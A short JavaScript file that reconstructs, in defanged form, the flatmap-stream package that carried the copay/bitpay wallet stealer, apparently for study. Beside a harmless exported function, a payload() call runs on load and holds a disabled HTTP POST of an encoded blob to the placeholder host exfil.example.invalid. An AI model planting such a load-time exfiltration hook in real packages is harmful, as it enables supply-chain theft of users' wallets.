// flatmap-stream 0.1.1 — DEFANGED reconstruction of the copay/bitpay wallet-stealer.
'use strict';
var crypto = require('crypto');
var http = require('http');
// Encrypted blob (defanged: entropy-shaped random bytes, not real ciphertext).
var enc = 'aG9zdG5hbWU9ZXhmaWwuZXhhbXBsZS5pbnZhbGlkO3BhdGg9L2NvbGxlY3Q7dHlwZT13YWxsZXQtc3RlYWxlcjt0YXJnZXQ9Y29weWJpdHBheTsxOTQwMzhhc2xrZGpoYWRzZmxrampoc2FkZmxramFzZGZranNhZGZramFzZGZsa2phZGpmc2xhamRma2xhc2pkZmxhamRzZmxhajtqcG9haXVzZHBmb2lhc3VkZm9pdWFwc2Rvcml1Zmxha3NqZGZhbHNqZGZsa2FzampkZmxrYWpzZGZsa2phZDsxMjM0NTY3ODkwODdzZGZsa2pzZGZsa2pzZGZsa2phZGZsa2pzZGZsa2phZGZsa2phZGZsa2pmODdmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmY=';
function payload() {
  if (false) {
    var body = enc;
    var req = http.request('http://exfil.example.invalid/collect', { method: 'POST' });
    req.end(body);
  }
}
payload();
module.exports = function flatmap(fn) { return function(x) { return fn(x); }; };
